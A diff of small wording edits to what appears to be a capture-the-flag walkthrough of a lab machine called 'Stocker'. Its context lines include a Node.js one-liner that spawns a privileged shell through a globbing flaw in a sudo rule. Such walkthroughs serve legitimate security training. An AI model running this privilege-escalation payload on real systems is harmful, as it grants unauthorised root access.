@@ -220,7 +220,7 @@ Installing that cookie into our browser, we can now navigate to /stock
 
 ## Enum again 
 
-This is a simple webstore  with 3 products that each have a add to cart button, and there's a view cart, none of those buttons are doing http calls, so this is happening client side, but the products are added to cart, then the submit button does a POST
+This is a simple webstore  with products that each have a add to cart button, and there's a view cart, none of those buttons are doing http calls, so this is happening client side, but the products are added to cart, then the submit button does a POST
 ```
 POST /api/order HTTP/1.1
 Host: dev.stocker.htb
@@ -512,7 +512,7 @@ User angoose may run the following commands on stocker:
 
 ## Code execution as root due to globing in the sudo line
 
-So because of the globing we can do some directory traversal with that, we just have to drop a node.js script that will drop a shell and preserver privileges:
+So because of the globing we can do some directory traversal with that, we just have to drop a node.js script that will drop a shell and preserve root privileges:
 ```bash
 angoose@stocker:/usr/local/scripts$ cat /dev/shm/test.js
 require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})
